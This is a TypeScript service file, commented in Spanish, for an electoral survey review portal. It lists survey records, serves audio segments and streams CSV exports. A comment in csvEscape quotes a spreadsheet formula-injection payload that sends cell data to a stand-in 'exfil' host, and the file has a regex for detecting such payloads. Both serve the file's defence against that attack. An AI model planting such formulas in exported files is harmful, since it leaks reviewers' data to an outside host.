// Servicio del lado REVISOR_QA para "Encuestas Okrean": listado paginado y
// lectura por lotes para el CSV. Es una RÉPLICA de qaExternaPersonasService (y su
// router hermano), no una extracción a una lib compartida: cada módulo de captura
// debe poder borrarse entero sin dejar utilidades huérfanas, y el repo ya tiene
// ese precedente documentado (qaExternaPersonasValidator.ts:27-31 duplica a
// propósito la validación de rango). A la tercera copia, unificar el CSV
// (escritor con contrapresión, csvEscape, cursor) en api/src/lib/csv.ts.
//
// Dos propiedades que se conservan del molde:
//
//  1. El filtro de fechas acota en UTC con límite superior EXCLUSIVO. Un
//     `lte: new Date(dateTo + 'T23:59:59')` se interpreta en la hora LOCAL del
//     proceso y corre el día según la TZ del contenedor.
//  2. La exportación se lee por lotes con cursor sobre `id` y nunca materializa
//     el resultado completo en RAM (.claude/rules/backend.md §B): el servidor
//     comparte hardware con el SAS.

import prisma from '../lib/prisma';
import { Prisma, EncuestaEstado, EncuestaElegibilidad } from '@prisma/client';
import { GOBERNANTES_V3, PERSONAS_V1, MEDIOS_V1 } from '../validators/encuestasIngestValidator';
import encuestasCsvHeaders from '../contracts/encuestasCsvHeaders.json';

/** Tope duro de filas exportables en una sola petición. */
export const MAX_ENCUESTAS_EXPORT = 50_000;

/** Tamaño de lote de la exportación (filas por consulta). */
export const ENCUESTAS_EXPORT_BATCH = 1_000;

export interface EncuestasListQuery {
  page?: number;
  limit?: number;
  dispositivo?: string;
  estado?: EncuestaEstado;
  /** true = solo con audio, false = solo sin audio, undefined = sin filtrar. */
  conAudio?: boolean;
  dateFrom?: string;
  dateTo?: string;
}

/**
 * Encuesta serializada para el listado del portal de revisión. Lleva las
 * columnas de las TRES versiones del cuestionario: cada fila llena las de la
 * suya y deja las otras en NULL.
 */
export interface EncuestaDto {
  id: number;
  idRemoto: string;
  folioLocal: string | null;
  /** null = registro capturado por una app anterior al campo. */
  encuestador: string | null;
  versionCuestionario: number;
  preferenciaElectoral: string | null;
  /** Texto libre de "otro" (v4). NULL = v1/v3 o cuando el código no es "otro". */
  preferenciaElectoralOtro: string | null;
  preferenciaPartido: string | null;
  /** Texto libre de "otro" (v4). NULL = v1/v3 o cuando el código no es "otro". */
  preferenciaPartidoOtro: string | null;
  conoceLalo: string | null;
  /**
   * Equivalentes v1 de las dos preferencias de arriba (P4 y P8 del cuestionario
   * restaurado). El listado enseña el par que corresponda a la versión de cada
   * fila en vez de dejar la columna en blanco para media tabla.
   */
  partidoPreferido: string | null;
  candidatoPreferido: string | null;
  duracionSegundos: number;
  fechaHoraFinalizacion: Date;
  recibidoEn: Date;
  /** null = el payload no traía bloque de ubicación; distinto de `false`. */
  ubicacionDisponible: boolean | null;
  /** Segmentos de audio recibidos; 0 = sin audio. */
  audiosCount: number;
  dispositivo: { id: number; identificador: string };
}

/**
 * Fila completa que alimenta el CSV: la UNIÓN de los campos de las dos
 * versiones del cuestionario, porque el archivo es uno solo. Los campos JSONB
 * se tipan `unknown` a propósito: Postgres devuelve lo que se guardó, y el
 * pivoteo comprueba la forma en tiempo de ejecución en vez de confiar en un
 * tipo que la BD no garantiza.
 *
 * `payloadRaw` y `payloadHash` NO están aquí ni en el select: el body crudo del
 * teléfono es solo auditoría y no sale del servidor.
 */
export interface EncuestaExportRow {
  id: number;
  idRemoto: string;
  idLocal: string;
  folioLocal: string | null;
  encuestador: string | null;
  recibidoEn: Date;
  fechaHoraInicio: Date;
  fechaHoraFinalizacion: Date;
  duracionSegundos: number;
  estado: EncuestaEstado;
  /** v1: la app la manda explícita. NULL = fila v3. */
  elegibilidad: EncuestaElegibilidad | null;
  versionCuestionario: number;
  sexo: string | null;
  rangoEdad: string | null;
  empresariosConocidos: unknown;
  politicosConocidos: unknown;
  conoceLalo: string | null;
  rolLalo: string | null;
  opinionLalo: string | null;
  preferenciaElectoral: string | null;
  /** Texto libre de "otro" (v4). NULL = v1/v3 o cuando el código no es "otro". */
  preferenciaElectoralOtro: string | null;
  preferenciaPartido: string | null;
  /** Texto libre de "otro" (v4). NULL = v1/v3 o cuando el código no es "otro". */
  preferenciaPartidoOtro: string | null;
  aprobacionPorGobernante: unknown;
  /** Bloque v1 (cuestionario restaurado). NULL = fila v3. */
  credencialVigente: string | null;
  genero: string | null;
  partidoPreferido: string | null;
  conocimientoPorPersona: unknown;
  mediosConocimiento: unknown;
  mayorPersonalidad: string | null;
  candidatoPreferido: string | null;
  ubicacionDisponible: boolean | null;
  ubicacionLat: number | null;
  ubicacionLng: number | null;
  ubicacionPrecisionM: number | null;
  ubicacionEsValida: boolean | null;
  ubicacionCapturadaAt: Date | null;
  ubicacionPermiso: string | null;
  ubicacionServicioActivo: boolean | null;
  ubicacionMotivoNoDisponible: string | null;
  dispositivoPlataforma: string;
  dispositivoModelo: string;
  dispositivoVersionSistema: string;
  versionAplicacion: string;
  dispositivo: { id: number; identificador: string };
}

const dispositivoSelect = { select: { id: true, identificador: true } } as const;

/**
 * Columnas del listado: EXACTAMENTE las del DTO. Se usa `select` y no `include`
 * porque `include` trae además todos los escalares del modelo, y uno de ellos es
 * `payload_raw`: el body JSON completo del teléfono, que el DTO tira a la basura.
 * Con `include`, una página de 100 filas movería cientos de KB de texto desde la
 * BD a la RAM del proceso para descartarlos acto seguido.
 */
const encuestaListSelect = {
  id: true,
  idRemoto: true,
  folioLocal: true,
  encuestador: true,
  versionCuestionario: true,
  preferenciaElectoral: true,
  preferenciaElectoralOtro: true,
  preferenciaPartido: true,
  preferenciaPartidoOtro: true,
  conoceLalo: true,
  partidoPreferido: true,
  candidatoPreferido: true,
  duracionSegundos: true,
  fechaHoraFinalizacion: true,
  recibidoEn: true,
  ubicacionDisponible: true,
  // Solo el conteo, nunca las filas: el listado enseña "3 audios" y el detalle
  // es quien trae la lista. Traer los audios aquí multiplicaría por N las filas
  // que Prisma mueve por una página de 100 encuestas.
  _count: { select: { audios: true } },
  dispositivo: dispositivoSelect,
} as const;

/**
 * Columnas de la exportación: las 53 cabeceras del CSV (v3 + v4 + v1). Es un select
 * distinto del listado a propósito —el CSV sí lleva los JSONB y el bloque de
 * ubicación completo—, pero comparte con él las dos exclusiones que importan:
 * `payloadRaw` y `payloadHash`.
 */
const encuestaExportSelect = {
  id: true,
  idRemoto: true,
  idLocal: true,
  folioLocal: true,
  encuestador: true,
  recibidoEn: true,
  fechaHoraInicio: true,
  fechaHoraFinalizacion: true,
  duracionSegundos: true,
  estado: true,
  elegibilidad: true,
  versionCuestionario: true,
  sexo: true,
  rangoEdad: true,
  empresariosConocidos: true,
  politicosConocidos: true,
  conoceLalo: true,
  rolLalo: true,
  opinionLalo: true,
  preferenciaElectoral: true,
  preferenciaElectoralOtro: true,
  preferenciaPartido: true,
  preferenciaPartidoOtro: true,
  aprobacionPorGobernante: true,
  credencialVigente: true,
  genero: true,
  partidoPreferido: true,
  conocimientoPorPersona: true,
  mediosConocimiento: true,
  mayorPersonalidad: true,
  candidatoPreferido: true,
  ubicacionDisponible: true,
  ubicacionLat: true,
  ubicacionLng: true,
  ubicacionPrecisionM: true,
  ubicacionEsValida: true,
  ubicacionCapturadaAt: true,
  ubicacionPermiso: true,
  ubicacionServicioActivo: true,
  ubicacionMotivoNoDisponible: true,
  dispositivoPlataforma: true,
  dispositivoModelo: true,
  dispositivoVersionSistema: true,
  versionAplicacion: true,
  dispositivo: dispositivoSelect,
} as const;

/**
 * Where compartido por el listado y la exportación: un solo lugar donde se
 * traducen los filtros del revisor, para que el CSV nunca contenga un conjunto
 * distinto del que se está viendo en pantalla.
 */
export function buildWhere(params: EncuestasListQuery): Prisma.EncuestaWhereInput {
  const where: Prisma.EncuestaWhereInput = {};
  if (params.dispositivo) {
    // Por etiqueta del equipo, no por id: es lo que el revisor tiene a mano.
    where.dispositivo = {
      identificador: { contains: params.dispositivo, mode: 'insensitive' },
    };
  }
  if (params.estado) where.estado = params.estado;
  if (params.conAudio !== undefined) {
    // `some`/`none` sobre la relación en vez de un conteo en memoria: Postgres
    // lo resuelve con un EXISTS y el filtro vale igual para el listado y para el
    // CSV (que comparten este where por el invariante de arriba). Se comprueba
    // contra `undefined` y no por veracidad: `false` es un filtro legítimo.
    where.audios = params.conAudio ? { some: {} } : { none: {} };
  }
  if (params.dateFrom || params.dateTo) {
    // Día civil completo en UTC: [dateFrom 00:00Z, dateTo+1 00:00Z). El rango va
    // sobre fechaHoraFinalizacion (cuándo se levantó la encuesta), no sobre
    // recibidoEn: un teléfono sin señal puede sincronizar días después.
    const dateToExclusive = params.dateTo ? new Date(`${params.dateTo}T00:00:00.000Z`) : null;
    if (dateToExclusive) dateToExclusive.setUTCDate(dateToExclusive.getUTCDate() + 1);
    where.fechaHoraFinalizacion = {
      ...(params.dateFrom ? { gte: new Date(`${params.dateFrom}T00:00:00.000Z`) } : {}),
      ...(dateToExclusive ? { lt: dateToExclusive } : {}),
    };
  }
  return where;
}

/**
 * Fila cruda del listado: el DTO menos el conteo aplanado, más el `_count` tal
 * como lo devuelve Prisma. El DTO publica `audiosCount` plano porque `_count` es
 * un detalle del ORM que no tiene por qué llegar al front.
 */
type EncuestaListRow = Omit<EncuestaDto, 'audiosCount'> & { _count: { audios: number } };

// Segunda red bajo `encuestaListSelect`: la consulta ya no pide `payloadRaw`, y
// este mapeo explícito garantiza que tampoco lo exponga quien algún día vuelva a
// `include`.
function toDto(row: EncuestaListRow): EncuestaDto {
  return {
    id: row.id,
    idRemoto: row.idRemoto,
    folioLocal: row.folioLocal,
    encuestador: row.encuestador,
    versionCuestionario: row.versionCuestionario,
    preferenciaElectoral: row.preferenciaElectoral,
    preferenciaElectoralOtro: row.preferenciaElectoralOtro,
    preferenciaPartido: row.preferenciaPartido,
    preferenciaPartidoOtro: row.preferenciaPartidoOtro,
    conoceLalo: row.conoceLalo,
    partidoPreferido: row.partidoPreferido,
    candidatoPreferido: row.candidatoPreferido,
    duracionSegundos: row.duracionSegundos,
    fechaHoraFinalizacion: row.fechaHoraFinalizacion,
    recibidoEn: row.recibidoEn,
    ubicacionDisponible: row.ubicacionDisponible,
    audiosCount: row._count.audios,
    dispositivo: { id: row.dispositivo.id, identificador: row.dispositivo.identificador },
  };
}

export async function list(params: EncuestasListQuery) {
  const page = params.page || 1;
  const limit = params.limit || 20;
  const skip = (page - 1) * limit;
  const where = buildWhere(params);

  const [rows, total] = await Promise.all([
    prisma.encuesta.findMany({
      where,
      skip,
      take: limit,
      // Por estampa del servidor: es el orden en que el revisor las ve llegar y
      // el único que no depende del reloj del teléfono.
      orderBy: { recibidoEn: 'desc' },
      select: encuestaListSelect,
    }),
    prisma.encuesta.count({ where }),
  ]);

  const data: EncuestaDto[] = rows.map(toDto);
  return { data, pagination: { page, limit, total, totalPages: Math.ceil(total / limit) } };
}

/**
 * Un segmento de audio tal como lo ve el revisor. NO lleva `ruta`: dónde está el
 * blob en el disco del servidor es interno, y el navegador solo necesita la URL
 * que sirve el stream. `sha256` sí sale: es la prueba de integridad que el
 * revisor puede contrastar contra lo que reportó el teléfono.
 */
export interface EncuestaAudioDto {
  id: number;
  segmento: string;
  sha256: string;
  tamanoBytes: number;
  mimeDeclarado: string | null;
  duracionMs: number | null;
  recibidoEn: Date;
  /** Ruta relativa same-origin para <audio src> y descarga (`?download=1`). */
  url: string;
}

/**
 * Detalle de una encuesta: el mismo DTO del listado más el `idLocal` (el UUID
 * con que la app nombra la encuesta, útil para cruzar con el teléfono) y la
 * lista de segmentos. El payload crudo y su hash siguen sin salir del servidor.
 */
export interface EncuestaDetalleDto extends EncuestaDto {
  idLocal: string;
  audios: EncuestaAudioDto[];
}

/**
 * URL same-origin del stream. Se arma en el servidor y no en el front para que
 * el contrato de la ruta viva en un solo sitio; el rewrite `/api/*` de Next
 * la resuelve sin CORS ni host absoluto (que rompería tras el proxy de Caddy).
 */
export function audioUrl(encuestaId: number, audioId: number): string {
  return `/api/encuestas/${encuestaId}/audios/${audioId}`;
}

export async function getById(id: number): Promise<EncuestaDetalleDto | null> {
  const row = await prisma.encuesta.findUnique({
    where: { id },
    select: {
      ...encuestaListSelect,
      idLocal: true,
      // Orden de llegada = orden de grabación (seg1, seg2…); ordenar por el
      // nombre fallaría en seg10 < seg2. El desempate por `id` hace el orden
      // estable cuando dos segmentos entran en el mismo milisegundo.
      audios: {
        orderBy: [{ recibidoEn: 'asc' }, { id: 'asc' }],
        select: {
          id: true,
          segmento: true,
          sha256: true,
          tamanoBytes: true,
          mimeDeclarado: true,
          duracionMs: true,
          recibidoEn: true,
        },
      },
    },
  });
  if (!row) return null;
  return {
    ...toDto(row),
    idLocal: row.idLocal,
    audios: row.audios.map((a) => ({ ...a, url: audioUrl(id, a.id) })),
  };
}

/** Lo mínimo para servir el blob: ruta en disco y con qué nombrarlo/tiparlo. */
export interface AudioParaServir {
  ruta: string;
  mimeDeclarado: string | null;
  segmento: string;
  idLocal: string;
}

/**
 * Busca el segmento EXIGIENDO que pertenezca a la encuesta de la URL
 * (`findFirst` con las dos claves, no `findUnique` por id): con solo el id, un
 * `/api/encuestas/1/audios/7` serviría el audio de cualquier otra encuesta y la
 * ruta dejaría de ser comprobable.
 */
export async function getAudioParaServir(
  encuestaId: number,
  audioId: number,
): Promise<AudioParaServir | null> {
  const a = await prisma.encuestaAudio.findFirst({
    where: { id: audioId, encuestaId },
    select: {
      ruta: true,
      mimeDeclarado: true,
      segmento: true,
      encuesta: { select: { idLocal: true } },
    },
  });
  return a
    ? {
        ruta: a.ruta,
        mimeDeclarado: a.mimeDeclarado,
        segmento: a.segmento,
        idLocal: a.encuesta.idLocal,
      }
    : null;
}

/**
 * Content-Type con que se sirve: el declarado si es un tipo audio/*, si no
 * audio/mp4 (AAC en MP4, lo habitual). El mime lo eligió el teléfono y se
 * guardó sin validar: la regex evita reflejar texto arbitrario en una cabecera
 * y el fallback impide servir como `text/html` algo que el navegador
 * interpretaría en el origen del portal.
 */
export function contentTypeDeAudio(mimeDeclarado: string | null): string {
  return mimeDeclarado && /^audio\/[A-Za-z0-9.+-]{1,60}$/.test(mimeDeclarado)
    ? mimeDeclarado
    : 'audio/mp4';
}

/**
 * Lee el conjunto a exportar por lotes, ordenado por `id` ascendente y paginado
 * con cursor (no con OFFSET, que degrada al avanzar). Corta en
 * MAX_ENCUESTAS_EXPORT: quien necesite más que descargue por rangos.
 */
export async function* iterateForExport(
  params: EncuestasListQuery,
  batchSize = ENCUESTAS_EXPORT_BATCH,
): AsyncGenerator<EncuestaExportRow[]> {
  const where = buildWhere(params);
  let cursorId: number | undefined;
  let emitidas = 0;

  while (emitidas < MAX_ENCUESTAS_EXPORT) {
    const take = Math.min(batchSize, MAX_ENCUESTAS_EXPORT - emitidas);
    const rows = await prisma.encuesta.findMany({
      where,
      take,
      orderBy: { id: 'asc' },
      ...(cursorId !== undefined ? { cursor: { id: cursorId }, skip: 1 } : {}),
      select: encuestaExportSelect,
    });

    if (rows.length === 0) return;
    emitidas += rows.length;
    cursorId = rows[rows.length - 1].id;
    yield rows;
    // Lote incompleto = se acabó el conjunto; ahorra una consulta vacía.
    if (rows.length < take) return;
  }
}

/**
 * Encabezados del CSV (53 columnas: 36 del contrato v3 + 2 nuevos de "otro" en v4 + 15 del v1),
 * en el mismo orden que produce toCsvRow. Es UN solo archivo con la unión de ambos
 * cuestionarios: cada fila llena las columnas de su versión y deja vacías las
 * de la otra, en vez de dos exportaciones que el revisor tendría que cruzar.
 *
 * Las 3 columnas de aprobación y las 7 de "Conoce <persona>" hacen pivoteo de su
 * JSONB por orden de GOBERNANTES_V3 y PERSONAS_V1: una columna fija por persona
 * es lo que permite ordenar y graficar en Excel.
 */
export const ENCUESTAS_CSV_HEADERS: readonly string[] = Object.freeze(encuestasCsvHeaders);

/** Celdas que Excel/LibreOffice evalúan como fórmula al abrir el archivo. */
const ARRANQUE_DE_FORMULA = /^[=+\-@\t\r]/;

/**
 * Escapa un valor para CSV (RFC 4180): entrecomilla si contiene coma, comilla,
 * salto de línea o retorno de carro, y duplica las comillas internas.
 * null/undefined salen como celda vacía, no como el texto "null".
 *
 * Además neutraliza las celdas de TEXTO que empiezan por `=`, `+`, `-`, `@`, TAB
 * o CR, anteponiéndoles un apóstrofo (la marca de "esto es texto" de Excel) y
 * entrecomillando siempre para que el apóstrofo viaje literal. Aquí hace falta
 * porque varias columnas son texto libre del teléfono —modelo, versión del
 * sistema, versión de la app, folio, encuestador, identificador del
 * dispositivo— y un equipo con API key válida puede mandar
 * `=HYPERLINK("http://exfil/?"&A2,"ok")` como modelo: la celda se ejecutaría en
 * la máquina del revisor al abrir el archivo.
 *
 * Los `number` quedan exentos: `-99.133209` es una coordenada, y prefijarla
 * rompería las columnas de latitud/longitud/precisión que el revisor sí grafica.
 *
 * Réplica de qaExternaPersonasService.csvEscape (ver cabecera del archivo).
 */
export function csvEscape(value: unknown): string {
  if (value === null || value === undefined) return '';
  const s = String(value);
  if (typeof value !== 'number' && ARRANQUE_DE_FORMULA.test(s)) {
    return `"'${s.replace(/"/g, '""')}"`;
  }
  return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

/**
 * Pivotea el JSONB de aprobación ([{gobernante, calificacion}]) a un mapa
 * gobernante→calificación. Ignora lo que no tenga la forma esperada en vez de
 * reventar: el CSV de 50 000 filas no puede caerse por una fila anómala (una
 * fila v1 trae NULL aquí).
 */
function calificacionesPorGobernante(valor: unknown): Map<string, string> {
  const mapa = new Map<string, string>();
  if (!Array.isArray(valor)) return mapa;
  for (const fila of valor) {
    if (!fila || typeof fila !== 'object') continue;
    const { gobernante, calificacion } = fila as { gobernante?: unknown; calificacion?: unknown };
    if (typeof gobernante === 'string' && typeof calificacion === 'string') {
      mapa.set(gobernante, calificacion);
    }
  }
  return mapa;
}

/**
 * Lista de nombres (texto libre) unida con ';'. Se emite en el orden guardado
 * (que es el orden en que el encuestador la dictó); cada entrada ya pasó por
 * el tope de 80 chars del validador y la celda completa pasa por csvEscape.
 */
function celdaDeLista(valor: unknown): string {
  if (!Array.isArray(valor)) return '';
  return valor.filter((v): v is string => typeof v === 'string').join(';');
}

/**
 * Pivotea el JSONB de P5 (`[{persona, nivel}]`) a un mapa persona→nivel. Ignora
 * lo que no tenga la forma esperada en vez de reventar, igual que el pivoteo de
 * aprobación de arriba: una fila v3 trae NULL aquí.
 */
function nivelesPorPersona(valor: unknown): Map<string, string> {
  const mapa = new Map<string, string>();
  if (!Array.isArray(valor)) return mapa;
  for (const fila of valor) {
    if (!fila || typeof fila !== 'object') continue;
    const { persona, nivel } = fila as { persona?: unknown; nivel?: unknown };
    if (typeof persona === 'string' && typeof nivel === 'string') mapa.set(persona, nivel);
  }
  return mapa;
}

/**
 * Dos celdas para P6: el tipo (`respondida` / `omitidaPorLogica`) y la lista de
 * medios unida con `;`. La lista se emite en el orden de MEDIOS_V1, no en el que
 * la mandó el teléfono, para que dos encuestas con los mismos medios produzcan
 * exactamente el mismo texto y la columna sea agrupable en Excel.
 */
function celdasDeMedios(valor: unknown): [string, string] {
  if (!valor || typeof valor !== 'object' || Array.isArray(valor)) return ['', ''];
  const { tipo, medios } = valor as { tipo?: unknown; medios?: unknown };
  const celdaTipo = typeof tipo === 'string' ? tipo : '';
  if (!Array.isArray(medios)) return [celdaTipo, ''];
  const elegidos = new Set(medios.filter((m): m is string => typeof m === 'string'));
  return [celdaTipo, MEDIOS_V1.filter((m) => elegidos.has(m)).join(';')];
}

/** Booleano de tres estados: NULL (dato ausente) es celda vacía, no "no". */
function siNo(valor: boolean | null | undefined): string {
  if (valor === null || valor === undefined) return '';
  return valor ? 'si' : 'no';
}

/** Una fila del CSV, terminada en CRLF (lo que espera Excel). */
export function toCsvRow(encuesta: EncuestaExportRow): string {
  const calificaciones = calificacionesPorGobernante(encuesta.aprobacionPorGobernante);
  const niveles = nivelesPorPersona(encuesta.conocimientoPorPersona);
  const [mediosTipo, mediosLista] = celdasDeMedios(encuesta.mediosConocimiento);

  return (
    [
      encuesta.idRemoto,
      encuesta.idLocal,
      encuesta.folioLocal,
      // Texto libre que teclea el encuestador en el teléfono: pasa por
      // csvEscape como el resto (comas, comillas y arranque de fórmula).
      encuesta.encuestador,
      // Todas las fechas en UTC, igual que se persisten: la hora local del
      // revisor no debe cambiar el contenido del archivo.
      encuesta.recibidoEn.toISOString(),
      encuesta.fechaHoraInicio.toISOString(),
      encuesta.fechaHoraFinalizacion.toISOString(),
      encuesta.duracionSegundos,
      encuesta.estado,
      encuesta.elegibilidad,
      encuesta.versionCuestionario,
      encuesta.credencialVigente,
      encuesta.sexo,
      // Única columna compartida por las tres versiones (catálogos disjuntos por versión).
      encuesta.rangoEdad,
      encuesta.genero,
      encuesta.partidoPreferido,
      celdaDeLista(encuesta.empresariosConocidos),
      celdaDeLista(encuesta.politicosConocidos),
      encuesta.conoceLalo,
      encuesta.rolLalo,
      encuesta.opinionLalo,
      encuesta.preferenciaElectoral,
      encuesta.preferenciaElectoralOtro,
      encuesta.preferenciaPartido,
      encuesta.preferenciaPartidoOtro,
      // Las 3 columnas de aprobación por gobernante, en orden de GOBERNANTES_V3.
      ...GOBERNANTES_V3.map((g) => calificaciones.get(g) ?? ''),
      // Las 7 columnas de P5 (v1), en orden de PERSONAS_V1. En una encuesta v1
      // noElegible P2–P8 no se almacenan, así que el mapa viene vacío y las 7
      // celdas salen vacías; en una fila v3 también, porque el JSONB es NULL.
      ...PERSONAS_V1.map((persona) => niveles.get(persona) ?? ''),
      mediosTipo,
      mediosLista,
      encuesta.mayorPersonalidad,
      encuesta.candidatoPreferido,
      siNo(encuesta.ubicacionDisponible),
      encuesta.ubicacionLat,
      encuesta.ubicacionLng,
      encuesta.ubicacionPrecisionM,
      siNo(encuesta.ubicacionEsValida),
      encuesta.ubicacionCapturadaAt ? encuesta.ubicacionCapturadaAt.toISOString() : '',
      encuesta.ubicacionPermiso,
      siNo(encuesta.ubicacionServicioActivo),
      encuesta.ubicacionMotivoNoDisponible,
      encuesta.dispositivoPlataforma,
      encuesta.dispositivoModelo,
      encuesta.dispositivoVersionSistema,
      encuesta.versionAplicacion,
      // El equipo registrado que porta la API key.
      encuesta.dispositivo.identificador,
    ]
      .map(csvEscape)
      .join(',') + '\r\n'
  );
}
